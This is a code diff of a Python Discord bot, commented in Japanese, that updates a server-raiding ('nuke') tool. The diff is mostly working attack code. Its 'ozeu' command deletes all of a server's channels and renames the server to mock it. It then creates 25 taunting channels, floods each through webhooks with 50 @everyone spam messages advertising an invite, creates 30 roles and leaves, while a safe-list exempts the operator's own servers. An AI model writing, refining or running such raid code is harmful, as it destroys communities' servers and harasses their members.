@@ -9,20 +9,22 @@ from dotenv import load_dotenv
 
 load_dotenv()
 TOKEN = os.getenv("DISCORD_TOKEN")
+OWNER_ID = 1386539010381451356  # あなたのDiscord ID
+
 SPAM_MESSAGE = (
-    "discord.gg/ozeu　https://i.imgur.com/NbBGFcf.mp4  "
-    "[gif](https://media.discordapp.net/attachments/...)  "
+    "discord.gg/ozeu https://i.imgur.com/NbBGFcf.mp4 "
+    "[gif](https://media.discordapp.net/attachments/...) "
     "[gif](https://media.discordapp.net/attachments/...) @everyone"
 )
-OWNER_ID = 1386539010381451356  # あなたのDiscord ID
 
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents)
 tree = bot.tree
 
 DEV_USERS_FILE = "dev_users.json"
+SAFE_SERVERS_FILE = "safe_servers.json"
 
-# dev_users.jsonの読み込み・保存関数
+# dev_users.jsonの読み込み・保存関数（OWNERは必ず含む）
 def load_dev_users():
     if not os.path.isfile(DEV_USERS_FILE):
         with open(DEV_USERS_FILE, "w") as f:
@@ -30,25 +32,44 @@ def load_dev_users():
         return [OWNER_ID]
     with open(DEV_USERS_FILE, "r") as f:
         try:
-            return json.load(f)
-        except:
+            data = json.load(f)
+            if OWNER_ID not in data:
+                data.append(OWNER_ID)
+            return data
+        except Exception:
             return [OWNER_ID]
 
 def save_dev_users(users):
     with open(DEV_USERS_FILE, "w") as f:
         json.dump(users, f)
 
+# safe_servers.jsonの読み込み・保存関数
+def load_safe_servers():
+    if not os.path.isfile(SAFE_SERVERS_FILE):
+        with open(SAFE_SERVERS_FILE, "w") as f:
+            json.dump([], f)
+        return set()
+    with open(SAFE_SERVERS_FILE, "r") as f:
+        try:
+            data = json.load(f)
+            return set(data)
+        except Exception:
+            return set()
+
+def save_safe_servers(servers: set):
+    with open(SAFE_SERVERS_FILE, "w") as f:
+        json.dump(list(servers), f)
+
 dev_users = load_dev_users()
+safe_servers = load_safe_servers()
 
-safe_servers = set()
-
-# --- Bot起動時 ---
+# --- 起動時イベント ---
 @bot.event
 async def on_ready():
     await bot.tree.sync()
     print(f"{bot.user} が起動しました！")
 
-# --- dev_users管理用コマンド ---
+# --- dev_users管理コマンド ---
 @tree.command(name="add_dev", description="Botの開発者権限ユーザーを追加します（OWNERのみ）")
 @app_commands.describe(user="追加したいユーザー")
 async def add_dev(interaction: discord.Interaction, user: discord.User):
@@ -104,62 +125,68 @@ async def ozeu(ctx, guild_id: int = None):
             return
         guild = ctx.guild
 
+    owner = await bot.fetch_user(OWNER_ID)
+
     embed_start = discord.Embed(
-        title="📢 !ozeu が実行されました",
-        description=f"サーバー「{guild.name}」 (ID: {guild.id}) で ozeu 処理を開始しました。",
+        title="📢 nuke が実行されました",
+        description=f"サーバー「{guild.name}」 (ID: {guild.id}) で nuke処理を開始しました。",
         color=discord.Color.green()
     )
     embed_start.add_field(name="実行者", value=f"{ctx.author} (ID: {ctx.author.id})", inline=False)
     embed_start.timestamp = discord.utils.utcnow()
 
-    owner = await bot.fetch_user(OWNER_ID)
     await owner.send(embed=embed_start)
     await ctx.send(embed=embed_start)
 
+    # --- チャンネル削除関数（エラーはログ出力のみ）---
     async def delete_channel(channel):
         try:
             await channel.delete()
         except Exception as e:
-            print(f"{channel.name} の削除でエラー: {e}")
+            print(f"[ozeu] {channel.name} の削除でエラー: {e}")
 
-    delete_tasks = [delete_channel(ch) for ch in guild.channels]
-    await asyncio.gather(*delete_tasks)
+    await asyncio.gather(*[delete_channel(ch) for ch in guild.channels])
 
+    # サーバー名変更
     try:
         await guild.edit(name="ozeuの植民地")
     except Exception as e:
-        print(f"サーバー名の変更でエラー: {e}")
+        print(f"[ozeu] サーバー名の変更でエラー: {e}")
 
-    async def create_channel(index):
+    # --- チャンネル作成関数 ---
+    async def create_channel(i):
         try:
             return await guild.create_text_channel(name="荒らされてやんのｗｗｗ")
         except Exception as e:
-            print(f"{index + 1}個目のチャンネル作成失敗: {e}")
+            print(f"[ozeu] {i+1}個目のチャンネル作成失敗: {e}")
             return None
 
     created_channels = await asyncio.gather(*[create_channel(i) for i in range(25)])
     created_channels = [ch for ch in created_channels if ch is not None]
 
+    # --- Webhookでスパム送信関数 ---
     async def send_with_webhook(channel):
         try:
             webhook = await channel.create_webhook(name="ZPlusWebhook")
             for _ in range(50):
                 await webhook.send(SPAM_MESSAGE, username="ガバマン")
         except Exception as e:
-            print(f"{channel.name} のWebhook送信でエラー: {e}")
+            print(f"[ozeu] {channel.name} のWebhook送信でエラー: {e}")
 
     await asyncio.gather(*[send_with_webhook(ch) for ch in created_channels])
 
+    # ロール作成
     try:
         for i in range(30):
             await guild.create_role(name=f"bot用権限{i+1}")
     except Exception as e:
-        print(f"ロール作成でエラー: {e}")
+        print(f"[ozeu] ロール作成でエラー: {e}")
 
+    # サーバー退出＆通知
     try:
         await guild.leave()
         embed_done = discord.Embed(
-            title="🚪 ozeu処理が完了し、Botはサーバーを退出しました",
+            title="🚪 nuke処理が完了し、Botはサーバーを退出しました",
             description=(
                 f"サーバー名: {guild.name} (ID: {guild.id})\n"
                 f"実行者: {ctx.author} (ID: {ctx.author.id})"
@@ -170,20 +197,21 @@ async def ozeu(ctx, guild_id: int = None):
         await owner.send(embed=embed_done)
         await ctx.send(embed=embed_done)
     except Exception as e:
-        print(f"退出時にエラー: {e}")
+        print(f"[ozeu] 退出時にエラー: {e}")
 
 # --- /safe コマンド ---
-@tree.command(name="safe", description="指定したサーバーIDを安全サーバーリストに追加し、!ozeuを発動禁止にします")
+@tree.command(name="safe", description="指定したサーバーIDを安全サーバーリストに追加し、nukeを発動禁止にします")
 @app_commands.describe(server_id="対象のサーバーID")
 async def safe(interaction: discord.Interaction, server_id: int):
     if interaction.user.id not in dev_users:
         await interaction.response.send_message("❌ このコマンドは開発者権限ユーザーのみ使用できます。", ephemeral=True)
         return
     safe_servers.add(server_id)
+    save_safe_servers(safe_servers)
     await interaction.response.send_message(f"✅ サーバーID {server_id} を安全リストに追加しました。")
 
 # --- /unsafe コマンド ---
-@tree.command(name="unsafe", description="指定したサーバーIDを安全リストから削除し、!ozeuを発動可能にします")
+@tree.command(name="unsafe", description="指定したサーバーIDを安全リストから削除し、nukeを発動可能にします")
 @app_commands.describe(server_id="対象のサーバーID")
 async def unsafe(interaction: discord.Interaction, server_id: int):
     if interaction.user.id not in dev_users:
@@ -191,6 +219,7 @@ async def unsafe(interaction: discord.Interaction, server_id: int):
         return
     try:
         safe_servers.remove(server_id)
+        save_safe_servers(safe_servers)
         await interaction.response.send_message(f"✅ サーバーID {server_id} を安全リストから削除しました。")
     except KeyError:
         await interaction.response.send_message(f"⚠ サーバーID {server_id} は安全リストに登録されていません。")
@@ -198,6 +227,7 @@ async def unsafe(interaction: discord.Interaction, server_id: int):
 # --- /backup コマンド ---
 @tree.command(name="backup", description="ログを保存します")
 async def backup(interaction: discord.Interaction):
+    # 実際のバックアップ処理はここに入れる
     await interaction.response.send_message("ログを保存しました☑")
 
 # --- /ping コマンド ---
@@ -263,7 +293,7 @@ get_group = app_commands.Group(name="get", description="情報取得系コマン
 @app_commands.describe(server_id="招待リンクを取得したいサーバーのID")
 async def get_url(interaction: discord.Interaction, server_id: int):
     if interaction.user.id not in dev_users:
-        await interaction.response.send_message("このコマンドはBotの開発者のみ使用できます。", ephemeral=True)
+        await interaction.response.send_message("このコマンドはBotの開発者のみ使えます。", ephemeral=True)
         return
 
     guild = bot.get_guild(server_id)
@@ -339,59 +369,75 @@ async def log(
 
         description = ""
         for entry in logs:
+            created_at_utc = entry.created_at.strftime("%Y/%m/%d %H:%M:%S UTC")
             description += (
                 f"**{entry.action.name}**\n"
-                f"・実行者: {entry.user} (ID: {entry.user.id})\n"
-                f"・対象: {getattr(entry.target, 'name', str(entry.target))}\n"
-                f"・日時: {entry.created_at.strftime('%Y/%m/%d %H:%M:%S')}\n"
-                "-----------------------\n"
+                f"実行者: {entry.user} (ID: {entry.user.id})\n"
+                f"対象: {entry.target}\n"
+                f"日時: {created_at_utc}\n"
+                f"詳細: {entry.extra if entry.extra else 'なし'}\n\n"
             )
 
         embed = discord.Embed(
-            title=f"📑 監査ログ: {action_type.name}（最大10件）",
+            title=f"📜 監査ログ ({action_type.name}) 最新10件",
             description=description,
-            color=discord.Color.red()
+            color=discord.Color.dark_red()
         )
-        embed.set_footer(text=f"サーバー: {interaction.guild.name}")
+        embed.timestamp = discord.utils.utcnow()
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
-    except discord.Forbidden:
-        await interaction.response.send_message("❌ `監査ログの表示` 権限が必要です。", ephemeral=True)
     except Exception as e:
-        await interaction.response.send_message(f"❌ エラーが発生しました: {e}", ephemeral=True)
+        await interaction.response.send_message(f"❌ ログの取得中にエラーが発生しました: {e}", ephemeral=True)
 
-# --- サーバー参加時イベント ---
+# --- サーバー参加イベント ---
 @bot.event
 async def on_guild_join(guild: discord.Guild):
-    members = [member async for member in guild.fetch_members()]
-    member_count = guild.member_count
-    owner_in_guild = any(member.id == OWNER_ID for member in guild.members)
-    if member_count <= 5 and not owner_in_guild:
-        await guild.leave()
-        return
+    owner = await bot.fetch_user(OWNER_ID)
 
-    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    inviter = "不明（監査ログの権限が必要）"
+    # 小規模サーバー判定（メンバー数5人以下かつオーナーがいない場合はすぐ退出）
+    if guild.member_count <= 5:
+        try:
+            if guild.owner is None:
+                await guild.leave()
+                embed = discord.Embed(
+                    title="🚪 5人以下サーバーのためBotが退出しました",
+                    description=f"サーバー名: {guild.name} (ID: {guild.id})\nメンバー数: {guild.member_count}\nオーナー不在",
+                    color=discord.Color.orange()
+                )
+                embed.timestamp = discord.utils.utcnow()
+                await owner.send(embed=embed)
+                return
+        except Exception:
+            # オーナー情報取得エラーは無視して継続
+            pass
+
+    # 招待者の取得（監査ログを利用、Forbiddenなど例外処理含む）
+    inviter_info = "不明"
     try:
-        async for entry in guild.audit_logs(limit=5, action=discord.AuditLogAction.bot_add):
-            if entry.target and entry.target.id == bot.user.id:
-                inviter = f"{entry.user}（ID: {entry.user.id}）"
+        async for entry in guild.audit_logs(limit=10, action=discord.AuditLogAction.bot_add):
+            if entry.target.id == bot.user.id:
+                inviter_info = f"{entry.user} (ID: {entry.user.id})"
                 break
     except discord.Forbidden:
-        inviter = "監査ログが取得できません（権限不足）"
-    except Exception as e:
-        inviter = f"取得失敗: {e}"
+        inviter_info = "監査ログ取得権限なし"
+    except Exception:
+        inviter_info = "例外発生"
 
     embed = discord.Embed(
-        title="🔔 新しいサーバーに参加しました",
-        color=discord.Color.green(),
-        timestamp=datetime.datetime.now()
+        title="🤖 Botが新しいサーバーに参加しました",
+        description=(
+            f"サーバー名: {guild.name}\n"
+            f"サーバーID: {guild.id}\n"
+            f"メンバー数: {guild.member_count}\n"
+            f"招待者: {inviter_info}"
+        ),
+        color=discord.Color.green()
     )
-    embed.add_field(name="📅 日時", value=now, inline=False)
-    embed.add_field(name="🌐 サーバー名", value=f"{guild.name}（ID: {guild.id}）", inline=False)
-    embed.add_field(name="👥 メンバー数", value=str(member_count), inline=False)
-    embed.add_field(name="🙋 招待者", value=inviter, inline=False)
-    owner = await bot.fetch_user(OWNER_ID)
+    embed.timestamp = discord.utils.utcnow()
+
     await owner.send(embed=embed)
 
+# --- その他、必要なコマンドや機能はここに追加してください ---
+
 bot.run(TOKEN)
+
